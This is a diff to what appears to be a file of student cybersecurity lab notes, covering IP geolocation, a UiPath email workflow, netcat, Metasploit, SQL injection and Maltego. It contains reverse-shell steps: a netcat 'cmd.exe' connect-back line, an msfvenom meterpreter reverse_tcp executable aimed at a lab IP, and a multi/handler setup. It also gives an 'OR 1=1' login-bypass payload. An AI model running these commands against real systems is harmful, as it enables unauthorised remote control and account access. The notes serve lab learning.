@@ -157,6 +157,12 @@ print("DECRYPTED MESSAGE IS: ", decrypted_message)
         #Step 4 – Using Ip latitude & longitude we can check the device current location.
         #IP LATITUDE 19.0760 (19° 4′ 33.51″ N)
         #IP LONGITUDE 72.8774 (72° 52′ 38.57″ E
+
+        # Step 5 - https://www.whatismyip.com/ip-address-lookup/
+        # check ip address 
+        # IPData.co and find the geolocation
+
+
          
 `;
 
@@ -207,11 +213,15 @@ print("DECRYPTED MESSAGE IS: ", decrypted_message)
 #Step 16 – Add the Data to Dialog Title as “DATA”, Input label as “ENTER THE EMAIL_ID OF RECEIVER” and Value entered as email.
 
 #Step 17 - Click on “+” and search “SMTP” and drop it.
-#Enter same Email and generated app password.
-#Enter Port 587 and server “smtp.gmail.com”
-#Enter value to subject and body to the receiver mail.
+#Enter same Email and generated app password. in Logon
+#Enter Port 587 and server “smtp.gmail.com”. in Host
+#Enter value to subject and body to the receiver mail.  Send SMTP Mail Message
+# To - eamil
+# Subject - "UIPATH"
+# Body - "Heyy Shipra!"
 
 #Step 18 - Click on “+” and search “Message Box” and drop it.
+# Message Box - email sent!
 
 #Step 19 – Now Run.
 
@@ -291,13 +301,14 @@ var text9 = ` # 9 NCAT
 # “ufw status”
 
 #Step 4 - The command "nc -lvp 22" starts a netcat listener on port 22 with verbose output enabled.
-# "nc -lvp 22"    
+# "nc -lvp 6969"
+# open cmd type : 192.168.0.103 6969 -e cmd.exe    
 
 #Step - 5 Now, start “msfconsole” and “msfvenom”.
 # msfconsole
 # msfvenom
 
-#Step 6 – Type msfvenom -p windows/meterpreter/reverse_tcp host=192.168.0.103 lport=22 -f exe> /home/shipra/Desktop/Shipra/reverse_tcp.exe
+#Step 6 – Type msfvenom -p windows/meterpreter/reverse_tcp host=192.168.0.103 lport=6969 -f exe> /home/shipra/Desktop/Shipra/reverse_tcp.exe
 
 #Step 7 - Now, use exploit.
 # use exploit
@@ -309,7 +320,7 @@ var text9 = ` # 9 NCAT
 #Step 9 - Now, start the exploit with the multi handler and set the lhost and lport.
 # use exploit/multi/handler
 # set lhost 192.168.0.103
-# set lport 22
+# set lport 6969
 # exploit
 
 # check reverse_tcp.exe in kali
@@ -343,7 +354,7 @@ var text10 = ` # 10 SQL Injection
 # OR payload
 
 # Step 3: Now we are going to use “OR Payload” to LOGIN.
-# Username: admin’ OR ‘1’=’1’  
+# Username: admin' OR '1'='1  
 # Password: password123
 
 # Login Successfully!
@@ -377,7 +388,7 @@ var text11 = ` # 11 Maltego
 
 # Step 6: Select “DNS Name” and drop.
 
-# Step 7: Right Click on DNS Name to edit the IP Address to find the IP Owner Details and RUN.
+# Step 7: Right Click on DNS Name to edit the IP Address to find the IP Owner Details and RUN. 
 
 # Step 8: Select “DOMAIN” and drop.
 
